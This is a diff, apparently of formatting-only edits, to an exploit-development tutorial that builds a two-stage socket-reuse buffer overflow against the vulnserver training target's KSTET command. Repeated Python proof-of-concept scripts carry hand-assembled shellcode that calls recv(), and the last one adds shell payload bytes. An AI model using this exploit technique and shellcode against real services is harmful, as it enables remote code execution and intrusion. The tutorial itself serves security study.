@@ -31,7 +31,7 @@ buffer+="Content-Length: 1048580\r\n\r\n"
 buffer+= bindshell 
 ```
 
-If we take a look at the `buffer` parameter, we can clearly see that this is an HTTP request. The vulnerability seems to arise from the [Host](https://www.itprotoday.com/devops-and-software-development/what-host-header) header. So, in order for this exploit to be successful- one must successfully replicate a valid HTTP request and then deliver the payload (shell, or proof of concept- or whatever it may be). If the HTTP request is not properly fulfilled, the back end server will most likely not even bat at eye at the request, and just discard it.
+If we take a look at the `buffer` parameter, we can clearly see that this is an HTTP request. The vulnerability seems to arise from the [Host](https://www.itprotoday.com/devops-and-software-development/what-host-header) header. So, in order for this exploit to be successful - one must successfully replicate a valid HTTP request and then deliver the payload (shell, or proof of concept - or whatever it may be). If the HTTP request is not properly fulfilled, the back end server will most likely not even bat at eye at the request, and just discard it.
 
 This is synonymous with what the `recv()` function requires. We are tasked with successfully fulfilling valid parameters in order to call the function. When, and only when, the function has all of the parameters it needs will it execute properly
 
@@ -48,9 +48,9 @@ int recv(
 );
 ```
 
-The first parameter, `SOCKET s`, is the file descriptor that references the socket connection. A file descriptor is a piece of data that the Operating System uses to reference a certain resource (file, socket connection, I/O resource, etc.). Since we will be working within the x86 architecture, this will look something like this- `0x00000090` (this number will vary). 
+The first parameter, `SOCKET s`, is the file descriptor that references the socket connection. A file descriptor is a piece of data that the Operating System uses to reference a certain resource (file, socket connection, I/O resource, etc.). Since we will be working within the x86 architecture, this will look something like this - `0x00000090` (this number will vary). 
 
-Also, one thing to remember, a file descriptor is utilized by the OS. The file descriptor is not actually a raw value of `0x00000090` (or whatever value the OS is using). The OS would not know what to do with this value, as it is not a coherent memory address- just an arbitrary value. The OS needs to utilize a memory address that points to the file descriptor value (a pointer).
+Also, one thing to remember, a file descriptor is utilized by the OS. The file descriptor is not actually a raw value of `0x00000090` (or whatever value the OS is using). The OS would not know what to do with this value, as it is not a coherent memory address - just an arbitrary value. The OS needs to utilize a memory address that points to the file descriptor value (a pointer).
 
 The second parameter, `char *buf`, is a pointer to the memory location the buffer is received at. Essentially, when developing our second stage payload, we will want to specify a memory location our execution will eventually reach.
 
@@ -60,7 +60,7 @@ The fourth parameter, `int flags`, is a numerical value that will allow for addi
 
 Finding the Call to WS_32.recv()
 ---
-As any network based buffer overflow works, we find a vulnerable parameter, command, or other field- and send data to that parameter. This POC does just that:
+As any network based buffer overflow works, we find a vulnerable parameter, command, or other field - and send data to that parameter. This POC does just that:
 
 ```python
 import os
@@ -97,7 +97,7 @@ command = "KSTET "
 
 # 2000 bytes to crash vulnserver.exe
 crash = "\x41" * 70
-crash += "\xb1\x11\x50\x62"	 # 0x625011b1 jmp eax essfunc.dll
+crash += "\xb1\x11\x50\x62"  # 0x625011b1 jmp eax essfunc.dll
 crash += "\x43" * (2000-len(crash))
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -142,7 +142,7 @@ Generating the File Descriptor
 ---
 Although we will need to push our parameters on the stack in reverse order, we will start by generating the file descriptor. 
 
-From the observations above- it seems that our file descriptor is the value `0x00000088`. Knowing this, we will create a piece of shellcode to reflect this. Here are the instructions generated, using [nasm_shell](https://github.com/fishstiqz/nasmshell):
+From the observations above - it seems that our file descriptor is the value `0x00000088`. Knowing this, we will create a piece of shellcode to reflect this. Here are the instructions generated, using [nasm_shell](https://github.com/fishstiqz/nasmshell):
 
 ```console
 nasm > xor ecx, ecx
@@ -195,7 +195,7 @@ The third instruction:
 ```console
 push ecx
 ```
-This gets the value onto the top of the stack. In other words, the value of `0x00000088` is being stored in ESP- as ESP contains the value of the item on top of the stack.
+This gets the value onto the top of the stack. In other words, the value of `0x00000088` is being stored in ESP - as ESP contains the value of the item on top of the stack.
 
 The last instruction:
 
@@ -224,14 +224,14 @@ command = "KSTET "
 crash = "\xCC" * 2
 
 # Creating File Descriptor = 0x00000088
-crash += "\x31\xc9"			# xor ecx, ecx
-crash += "\x80\xc1\x88"			# add cl, 0x88
-crash += "\x51"				# push ecx
-crash += "\x89\xe7"			# mov edi, esp
+crash += "\x31\xc9"     # xor ecx, ecx
+crash += "\x80\xc1\x88"     # add cl, 0x88
+crash += "\x51"       # push ecx
+crash += "\x89\xe7"     # mov edi, esp
 
 # 70 byte offset to EIP
 crash += "\x41" * (70-len(crash))
-crash += "\xb1\x11\x50\x62"	 # 0x625011b1 jmp eax essfunc.dll
+crash += "\xb1\x11\x50\x62"  # 0x625011b1 jmp eax essfunc.dll
 crash += "\x43" * (2000-len(crash))
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -274,11 +274,11 @@ EDI and ESP both contain the memory address that points to the value `0x00000088
 Moving the Stack Out of the Way
 ---
 
-As mentioned earlier about LIFO, there is another property of the stack that is going to ruin our exploit as it stands. As the stack grows, and things are pushed onto it- the stack grows towards the lower memory addresses. Our shellcode is growing toward the higher memory addresses:
+As mentioned earlier about LIFO, there is another property of the stack that is going to ruin our exploit as it stands. As the stack grows, and things are pushed onto it - the stack grows towards the lower memory addresses. Our shellcode is growing toward the higher memory addresses:
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/013.png" alt="">
 
-What we can do to circumvent this constraint, is to subtract the value of ESP, which is a memory address, by 50. This means our stack will be located ABOVE our shellcode. And since the stack grows downwards, it will never reach our shellcode. This is because the shellcode, which is growing towards the higher addresses, is growing in the opposite way of the stack- and the stack is located above our shellcode:
+What we can do to circumvent this constraint, is to subtract the value of ESP, which is a memory address, by 50. This means our stack will be located ABOVE our shellcode. And since the stack grows downwards, it will never reach our shellcode. This is because the shellcode, which is growing towards the higher addresses, is growing in the opposite way of the stack - and the stack is located above our shellcode:
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/014a.png" alt="">
 
@@ -304,17 +304,17 @@ command = "KSTET "
 crash = "\xCC" * 2
 
 # Creating File Descriptor = 0x00000088
-crash += "\x31\xc9"			# xor ecx, ecx
-crash += "\x80\xc1\x88"			# add cl, 0x88
-crash += "\x51"				# push ecx
-crash += "\x89\xe7"			# mov edi, esp
+crash += "\x31\xc9"     # xor ecx, ecx
+crash += "\x80\xc1\x88"     # add cl, 0x88
+crash += "\x51"       # push ecx
+crash += "\x89\xe7"     # mov edi, esp
 
 # Move ESP out of the way
-crash += "\x83\xec\x50"			# sub esp, 0x50
+crash += "\x83\xec\x50"     # sub esp, 0x50
 
 # 70 byte offset to EIP
 crash += "\x41" * (70-len(crash))
-crash += "\xb1\x11\x50\x62"	 # 0x625011b1 jmp eax essfunc.dll
+crash += "\xb1\x11\x50\x62"  # 0x625011b1 jmp eax essfunc.dll
 crash += "\x43" * (2000-len(crash))
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -334,7 +334,7 @@ As we can see, ESP is now pointing about 50 bytes above our initial buffer of A'
 
 Flags
 ---
-Now that the file descriptor is out of the way- we will start with the last parameter, the flags. 
+Now that the file descriptor is out of the way - we will start with the last parameter, the flags. 
 
 The flags are the most painless of the parameters. All that is needed is a value of `0x00000000` on the stack. Here is the shellcode for this:
 
@@ -376,21 +376,21 @@ command = "KSTET "
 crash = "\xCC" * 2
 
 # Creating File Descriptor = 0x00000088
-crash += "\x31\xc9"			# xor ecx, ecx
-crash += "\x80\xc1\x88"			# add cl, 0x88
-crash += "\x51"				# push ecx
-crash += "\x89\xe7"			# mov edi, esp
+crash += "\x31\xc9"     # xor ecx, ecx
+crash += "\x80\xc1\x88"     # add cl, 0x88
+crash += "\x51"       # push ecx
+crash += "\x89\xe7"     # mov edi, esp
 
 # Move ESP out of the way
-crash += "\x83\xec\x50"			# sub esp, 0x50
+crash += "\x83\xec\x50"     # sub esp, 0x50
 
 # Flags
 crash += "\x31\xd2"
-crash += "\x52"				# push edx
+crash += "\x52"       # push edx
 
 # 70 byte offset to EIP
 crash += "\x41" * (70-len(crash))
-crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
+crash += "\xb1\x11\x50\x62"   # 0x625011b1 jmp eax essfunc.dll
 crash += "\x43" * (2000-len(crash))
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -419,7 +419,7 @@ BufSize
 ---
 Here is where we will determine our buffer size. Since we are working with hexadecimal, we will choose an easy number that is equivalent to a decimal amount enough for a shell (more than 350 bytes). We will choose 512 decimal, or `0x00000200` in __DWORD__ hexadecimal.
 
-We will deploy a technique referenced above- (when we added to cl). Since EDX is already equal to zero from our flags parameter, let's use this register to do our calculations.
+We will deploy a technique referenced above - (when we added to cl). Since EDX is already equal to zero from our flags parameter, let's use this register to do our calculations.
 
 This time, we will add to the DH (data high) register, which is an 8-bit register within the 16-bit register DX, which is a part of the 32-bit register EDX. This register is not at the MOST significant byte (since we are utilizing a little endian architecture), but close to.
 
@@ -455,25 +455,25 @@ command = "KSTET "
 crash = "\xCC" * 2
 
 # Creating File Descriptor = 0x00000088
-crash += "\x31\xc9"			# xor ecx, ecx
-crash += "\x80\xc1\x88"			# add cl, 0x88
-crash += "\x51"				# push ecx
-crash += "\x89\xe7"			# mov edi, esp
+crash += "\x31\xc9"     # xor ecx, ecx
+crash += "\x80\xc1\x88"     # add cl, 0x88
+crash += "\x51"       # push ecx
+crash += "\x89\xe7"     # mov edi, esp
 
 # Move ESP out of the way
-crash += "\x83\xec\x50"			# sub esp, 0x50
+crash += "\x83\xec\x50"     # sub esp, 0x50
 
 # Flags = 0x00000000
 crash += "\x31\xd2"
-crash += "\x52"				# push edx
+crash += "\x52"       # push edx
 
 # BufSize = 0x00000200
-crash += "\x80\xc6\x02"			# add dh, 0x02
-crash += "\x52"				# push edx
+crash += "\x80\xc6\x02"     # add dh, 0x02
+crash += "\x52"       # push edx
 
 # 70 byte offset to EIP
 crash += "\x41" * (70-len(crash))
-crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
+crash += "\xb1\x11\x50\x62"   # 0x625011b1 jmp eax essfunc.dll
 crash += "\x43" * (2000-len(crash))
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -504,7 +504,7 @@ As mentioned earlier, this is the parameter that will determine where our buffer
 
 Knowing this, we will have to do a slight stack alignment. Here, we will use EBX as our register to perform our calculations.
 
-We will push the value of ESP onto the stack and pop it into EBX. We will then perform calculations to EBX- to get it equal to the location we would like our buffer to land. Then, we will push this item onto the stack, as our second to last (or visually second) parameter.
+We will push the value of ESP onto the stack and pop it into EBX. We will then perform calculations to EBX - to get it equal to the location we would like our buffer to land. Then, we will push this item onto the stack, as our second to last (or visually second) parameter.
 
 Before we get into that though, let's see what we are working with.
 
@@ -571,31 +571,31 @@ command = "KSTET "
 crash = "\xCC" * 2
 
 # Creating File Descriptor = 0x00000088
-crash += "\x31\xc9"			# xor ecx, ecx
-crash += "\x80\xc1\x88"			# add cl, 0x88
-crash += "\x51"				# push ecx
-crash += "\x89\xe7"			# mov edi, esp
+crash += "\x31\xc9"     # xor ecx, ecx
+crash += "\x80\xc1\x88"     # add cl, 0x88
+crash += "\x51"       # push ecx
+crash += "\x89\xe7"     # mov edi, esp
 
 # Move ESP out of the way
-crash += "\x83\xec\x50"			# sub esp, 0x50
+crash += "\x83\xec\x50"     # sub esp, 0x50
 
 # Flags = 0x00000000
 crash += "\x31\xd2"
-crash += "\x52"				# push edx
+crash += "\x52"       # push edx
 
 # BufSize = 0x00000200
-crash += "\x80\xc6\x02"			# add dh, 0x02
-crash += "\x52"				# push edx
+crash += "\x80\xc6\x02"     # add dh, 0x02
+crash += "\x52"       # push edx
 
 # Buffer = 0x00C0F9F0
-crash += "\x54"				# push esp
-crash += "\x5b"				# pop ebx
-crash += "\x83\xc3\x4c"			# add ebx, 0x4c
-crash += "\x53"				# push ebx
+crash += "\x54"       # push esp
+crash += "\x5b"       # pop ebx
+crash += "\x83\xc3\x4c"     # add ebx, 0x4c
+crash += "\x53"       # push ebx
 
 # 70 byte offset to EIP
 crash += "\x41" * (70-len(crash))
-crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
+crash += "\xb1\x11\x50\x62"   # 0x625011b1 jmp eax essfunc.dll
 crash += "\x43" * (2000-len(crash))
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -626,7 +626,7 @@ push ebx
 
 File Descriptor, We Meet Again.
 ---
-It is time to push our file descriptor onto the stack. Remember- our file descriptor is located in EDI. However, we cannot just execute a `push edi` instruction. Right now, EDI contains an actual value of __`00C0F9FC`__. Executing a `push edi` would literally put the value __`00C0F9FC`__ onto the stack.
+It is time to push our file descriptor onto the stack. Remember - our file descriptor is located in EDI. However, we cannot just execute a `push edi` instruction. Right now, EDI contains an actual value of __`00C0F9FC`__. Executing a `push edi` would literally put the value __`00C0F9FC`__ onto the stack.
 
 We would like the value of `0x00000088` to be on the stack. Recall that the value of `0x00000088` is pointed to by EDI! That means if we can push the data that EDI references (or points to), we could get the file descriptor onto the stack.
 
@@ -636,7 +636,7 @@ We will need to execute this instruction:
 push dword ptr ds:[edi]
 ```
 
-This will push the double word (__DWORD__, we are using a 32-bit register) pointer referenced in the data segment (ds) of EDI.
+This will push the double word (__DWORD__, we are using a 32-bit register) pointer referenced in the data segment (`ds`) of EDI.
 
 Shellcode instructions:
 
@@ -659,34 +659,34 @@ command = "KSTET "
 crash = "\xCC" * 2
 
 # Creating file descriptor = 0x00000088
-crash += "\x31\xc9"			# xor ecx, ecx
-crash += "\x80\xc1\x88"			# add cl, 0x88
-crash += "\x51"				# push ecx
-crash += "\x89\xe7"			# mov edi, esp
+crash += "\x31\xc9"     # xor ecx, ecx
+crash += "\x80\xc1\x88"     # add cl, 0x88
+crash += "\x51"       # push ecx
+crash += "\x89\xe7"     # mov edi, esp
 
 # Move ESP out of the way
-crash += "\x83\xec\x50"			# sub esp, 0x50
+crash += "\x83\xec\x50"     # sub esp, 0x50
 
 # Flags = 0x00000000
 crash += "\x31\xd2"
-crash += "\x52"				# push edx
+crash += "\x52"       # push edx
 
 # BufSize = 0x00000200
-crash += "\x80\xc6\x02"			# add dh, 0x02
-crash += "\x52"				# push edx
+crash += "\x80\xc6\x02"     # add dh, 0x02
+crash += "\x52"       # push edx
 
 # Buffer = 0x00C0F9F0
-crash += "\x54"				# push esp
-crash += "\x5b"				# pop ebx
-crash += "\x83\xc3\x4c"			# add ebx, 0x4c
-crash += "\x53"				# push ebx
+crash += "\x54"       # push esp
+crash += "\x5b"       # pop ebx
+crash += "\x83\xc3\x4c"     # add ebx, 0x4c
+crash += "\x53"       # push ebx
 
 # Push file descriptor onto the stack:
-crash += "\xff\x37"			# push dword ptr ds:[edi]
+crash += "\xff\x37"     # push dword ptr ds:[edi]
 
 # 70 byte offset to EIP
 crash += "\x41" * (70-len(crash))
-crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
+crash += "\xb1\x11\x50\x62"   # 0x625011b1 jmp eax essfunc.dll
 crash += "\x43" * (2000-len(crash))
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -712,7 +712,7 @@ If you double click on the instruction itself, you will see the actual instructi
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/028.png" alt="">
 
-This is the instruction we will actually need to execute! This is where the actual call to the 1st instruction of the function occurs. There is one slight issue though- this address contains a null byte!
+This is the instruction we will actually need to execute! This is where the actual call to the 1st instruction of the function occurs. There is one slight issue though - this address contains a null byte!
 
 As exploit developers know, a null byte (__\x00__) can be a death sentence. The operating system recognizes this character as a string terminator and will disregard anything that comes after it. 
 
@@ -759,9 +759,9 @@ The answer here is simple. A `jmp` will simply just go to that memory location. 
 
 As you can see, a `call` instruction will actually push a value onto the stack. This is needed in order to get all of our parameters on the stack, in the correct order. If we simply just used a `jmp`, all of our parameters on the stack will be one line off, because we are depending on the `call` instruction to push all of our instructions down into the correct place. 
 
-Before we update the POC, we will have to add a buffer of 512 bytes, to satisfy the BufSize parameter we specified. In addition, since this is a two stage payload, we will sleep the connection for 5 seconds, before sending the second stage payload- to make sure everything gets a chance to execute.
+Before we update the POC, we will have to add a buffer of 512 bytes, to satisfy the BufSize parameter we specified. In addition, since this is a two stage payload, we will sleep the connection for 5 seconds, before sending the second stage payload - to make sure everything gets a chance to execute.
 
-(Note- in order to sleep the connection, import the __time__ library).
+(Note - in order to sleep the connection, import the __time__ library).
 
 Here is the updated POC:
 
@@ -779,30 +779,30 @@ command = "KSTET "
 crash = "\xCC" * 2
 
 # Creating file descriptor = 0x00000088
-crash += "\x31\xc9"			# xor ecx, ecx
-crash += "\x80\xc1\x88"			# add cl, 0x88
-crash += "\x51"				# push ecx
-crash += "\x89\xe7"			# mov edi, esp
+crash += "\x31\xc9"     # xor ecx, ecx
+crash += "\x80\xc1\x88"     # add cl, 0x88
+crash += "\x51"       # push ecx
+crash += "\x89\xe7"     # mov edi, esp
 
 # Move ESP out of the way
-crash += "\x83\xec\x50"			# sub esp, 0x50
+crash += "\x83\xec\x50"     # sub esp, 0x50
 
 # Flags = 0x00000000
 crash += "\x31\xd2"
-crash += "\x52"				# push edx
+crash += "\x52"       # push edx
 
 # BufSize = 0x00000200
-crash += "\x80\xc6\x02"			# add dh, 0x02
-crash += "\x52"				# push edx
+crash += "\x80\xc6\x02"     # add dh, 0x02
+crash += "\x52"       # push edx
 
 # Buffer = 0x00C0F9F0
-crash += "\x54"				# push esp
-crash += "\x5b"				# pop ebx
-crash += "\x83\xc3\x4c"			# add ebx, 0x4c
-crash += "\x53"				# push ebx
+crash += "\x54"       # push esp
+crash += "\x5b"       # pop ebx
+crash += "\x83\xc3\x4c"     # add ebx, 0x4c
+crash += "\x53"       # push ebx
 
 # Push file descriptor onto the stack:
-crash += "\xff\x37"			# push dword ptr ds:[edi]
+crash += "\xff\x37"     # push dword ptr ds:[edi]
 
 # Calling W2_32.recv()
 crash += "\xB8\x11\x2C\x25\x40"           # mov eax, 0x40252C11
@@ -811,7 +811,7 @@ crash += "\xff\xd0"                       # call eax
 
 # 70 byte offset to EIP
 crash += "\x41" * (70-len(crash))
-crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
+crash += "\xb1\x11\x50\x62"   # 0x625011b1 jmp eax essfunc.dll
 crash += "\x43" * (2000-len(crash))
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -862,30 +862,30 @@ command = "KSTET "
 crash = "\x41" * 2
 
 # Creating file descriptor = 0x00000088
-crash += "\x31\xc9"			# xor ecx, ecx
-crash += "\x80\xc1\x88"			# add cl, 0x88
-crash += "\x51"				# push ecx
-crash += "\x89\xe7"			# mov edi, esp
+crash += "\x31\xc9"     # xor ecx, ecx
+crash += "\x80\xc1\x88"     # add cl, 0x88
+crash += "\x51"       # push ecx
+crash += "\x89\xe7"     # mov edi, esp
 
 # Move ESP out of the way
-crash += "\x83\xec\x50"			# sub esp, 0x50
+crash += "\x83\xec\x50"     # sub esp, 0x50
 
 # Flags = 0x00000000
 crash += "\x31\xd2"
-crash += "\x52"				# push edx
+crash += "\x52"       # push edx
 
 # BufSize = 0x00000200
-crash += "\x80\xc6\x02"			# add dh, 0x02
-crash += "\x52"				# push edx
+crash += "\x80\xc6\x02"     # add dh, 0x02
+crash += "\x52"       # push edx
 
 # Buffer = 0x00C0F9F0
-crash += "\x54"				# push esp
-crash += "\x5b"				# pop ebx
-crash += "\x83\xc3\x4c"			# add ebx, 0x4c
-crash += "\x53"				# push ebx
+crash += "\x54"       # push esp
+crash += "\x5b"       # pop ebx
+crash += "\x83\xc3\x4c"     # add ebx, 0x4c
+crash += "\x53"       # push ebx
 
 # Push file descriptor onto the stack:
-crash += "\xff\x37"			# push dword ptr ds:[edi]
+crash += "\xff\x37"     # push dword ptr ds:[edi]
 
 # Calling W2_32.recv()
 crash += "\xB8\x11\x2C\x25\x40"           # mov eax, 0x40252C11
@@ -894,7 +894,7 @@ crash += "\xff\xd0"                       # call eax
 
 # 70 byte offset to EIP
 crash += "\x41" * (70-len(crash))
-crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
+crash += "\xb1\x11\x50\x62"   # 0x625011b1 jmp eax essfunc.dll
 crash += "\x43" * (2000-len(crash))
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -932,7 +932,7 @@ EIP after stepping through:
 Weaponizing the Proof of Concept
 ---
 
-From here, all we have is a vanilla buffer overflow- where EIP is already pointed to our buffer. Let's get a shell.
+From here, all we have is a vanilla buffer overflow - where EIP is already pointed to our buffer. Let's get a shell.
 
 ```python
 import os
@@ -977,30 +977,30 @@ shell += "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
 crash = "\x41" * 2
 
 # Creating file descriptor = 0x00000088
-crash += "\x31\xc9"			# xor ecx, ecx
-crash += "\x80\xc1\x88"			# add cl, 0x88
-crash += "\x51"				# push ecx
-crash += "\x89\xe7"			# mov edi, esp
+crash += "\x31\xc9"     # xor ecx, ecx
+crash += "\x80\xc1\x88"     # add cl, 0x88
+crash += "\x51"       # push ecx
+crash += "\x89\xe7"     # mov edi, esp
 
 # Move ESP out of the way
-crash += "\x83\xec\x50"			# sub esp, 0x50
+crash += "\x83\xec\x50"     # sub esp, 0x50
 
 # Flags = 0x00000000
 crash += "\x31\xd2"
-crash += "\x52"				# push edx
+crash += "\x52"       # push edx
 
 # BufSize = 0x00000200
-crash += "\x80\xc6\x02"			# add dh, 0x02
-crash += "\x52"				# push edx
+crash += "\x80\xc6\x02"     # add dh, 0x02
+crash += "\x52"       # push edx
 
 # Buffer = 0x00C0F9F0
-crash += "\x54"				# push esp
-crash += "\x5b"				# pop ebx
-crash += "\x83\xc3\x4c"			# add ebx, 0x4c
-crash += "\x53"				# push ebx
+crash += "\x54"       # push esp
+crash += "\x5b"       # pop ebx
+crash += "\x83\xc3\x4c"     # add ebx, 0x4c
+crash += "\x53"       # push ebx
 
 # Push file descriptor onto the stack:
-crash += "\xff\x37"			# push dword ptr ds:[edi]
+crash += "\xff\x37"     # push dword ptr ds:[edi]
 
 # Calling W2_32.recv()
 crash += "\xB8\x11\x2C\x25\x40"           # mov eax, 0x40252C11
@@ -1009,7 +1009,7 @@ crash += "\xff\xd0"                       # call eax
 
 # 70 byte offset to EIP
 crash += "\x41" * (70-len(crash))
-crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
+crash += "\xb1\x11\x50\x62"   # 0x625011b1 jmp eax essfunc.dll
 crash += "\x43" * (2000-len(crash))
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -1030,6 +1030,6 @@ Final Thoughts
 ---
 I thought this was a pretty interesting technique. So much can be done with shellcoding and exploit development by utilizing the Windows API, as you cannot make a directly syscall (like Linux). Obviously, the file descriptor may be something to be concerned about, as it varies on operating systems. I have only ever seen a file descriptor that references a socket connection with either a value of __`80, 84, 88`__, or __`90`__.
 
-Any questions or things I could have done better- please contact me. I am always open to constructive criticism.
+Any questions or things I could have done better - please contact me. I am always open to constructive criticism.
 
 Peace, love, and positivity :-)
